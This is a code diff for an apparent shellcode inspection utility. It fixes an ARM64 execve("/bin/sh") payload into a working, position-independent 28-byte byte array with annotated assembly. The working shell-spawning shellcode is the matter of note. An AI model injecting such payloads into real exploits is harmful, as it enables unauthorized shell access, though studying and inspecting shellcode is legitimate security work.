@@ -46,21 +46,24 @@ static const unsigned char x86_64_shellcode[] = {
 };
 
 /*
- * ARM64 execve("/bin/sh", NULL, NULL) Shellcode (36 bytes)
+ * ARM64 execve("/bin/sh", NULL, NULL) Position-Independent Shellcode (28 bytes)
  *
  * Assembly breakdown:
- *   e0 03 1f aa             mov    x0, xzr              ; X0 = 0
- *   e1 03 1f aa             mov    x1, xzr              ; X1 = 0
- *   e2 03 1f aa             mov    x2, xzr              ; X2 = 0
+ *   a0 00 00 10             adr    x0, #20              ; X0 = pointer to "/bin/sh" string
+ *   e1 03 1f aa             mov    x1, xzr              ; X1 = NULL argv
+ *   e2 03 1f aa             mov    x2, xzr              ; X2 = NULL envp
  *   a8 1b 80 d2             mov    x8, #0xdd            ; X8 = 221 (__NR_execve)
- *   00 00 80 d2             ... string setup ...
  *   01 00 00 d4             svc    #0                   ; Supervisor call
+ *   2f 62 69 6e 2f 73 68 00 .string "/bin/sh"           ; Embedded null-terminated string
  */
 static const unsigned char arm64_shellcode[] = {
+    0xa0, 0x00, 0x00, 0x10, /* adr x0, #20 -> points to "/bin/sh" */
     0xe1, 0x03, 0x1f, 0xaa, /* mov x1, xzr */
     0xe2, 0x03, 0x1f, 0xaa, /* mov x2, xzr */
     0xa8, 0x1b, 0x80, 0xd2, /* mov x8, #221 (__NR_execve) */
-    0x01, 0x00, 0x00, 0xd4  /* svc #0 */
+    0x01, 0x00, 0x00, 0xd4, /* svc #0 */
+    0x2f, 0x62, 0x69, 0x6e, /* "/bin" */
+    0x2f, 0x73, 0x68, 0x00  /* "/sh\0" */
 };
 
 void inspect_shellcode(const unsigned char *code, size_t len, const char *arch_name)
